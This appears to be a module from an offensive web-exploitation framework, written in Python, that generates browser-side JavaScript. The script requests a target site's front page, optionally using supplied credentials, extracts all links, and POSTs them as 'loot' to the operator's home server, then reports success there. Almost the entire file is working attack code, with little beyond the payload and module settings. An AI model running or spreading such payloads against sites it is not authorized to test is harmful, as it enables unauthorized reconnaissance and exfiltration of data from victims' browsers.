#!/usr/bin/env python2
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.


from lib.module.exploit import ExploitClass
from lib.module import payload
from lib.module.safety import Safety
from lib.module.intrusiveness import Intrusiveness

class ExploitModule(ExploitClass):
    def __init__(self):
        super().__init__(**{
            'Name': 'Get links front page',
            'Description': "Get all links on the front page.",
            'Options': [],
            'OptionalOptions': ["USERNAME", "USERPASS"],
            'Store': [],
            'Ports': [80, 8080, 8888],
            'classification': (Safety.SAFE, Intrusiveness.NONE),
            'products':[
                {"product":"Generic Web Server OK"}
            ]
        })

    def exploit_code(self, payload):
        code = """
var username = ${USERNAME};
var password = ${USERPASS};
var home = ${HOME};
var modid = ${MODID};
function receive_response(xhr, method, resource, data, user, pass)   {
    if(xhr.status == 200)   {
        console.log(xhr);
        var links = [];
        var el = document.createElement("html");
        el.innerHTML = xhr.response;
        var refs = el.getElementsByTagName("a");
        for(var i = 0; i < refs.length; i++)    {
            console.log(refs[i]);
            links.push(refs[i].getAttribute("href"));
        }
        Network.request("POST", home + "/store/loot/" + document.domain, JSON.stringify({"links":links}), function(xhr2)   {
            console.log(xhr2)
            Network.request("POST",
                home + "/module/finished/" + document.domain + "/" + modid + "/success",
                null, console.log
            );
        });
    }
}
Network.request_advanced("GET", "/", null, receive_response, null, null, username, password);
        """
        return code
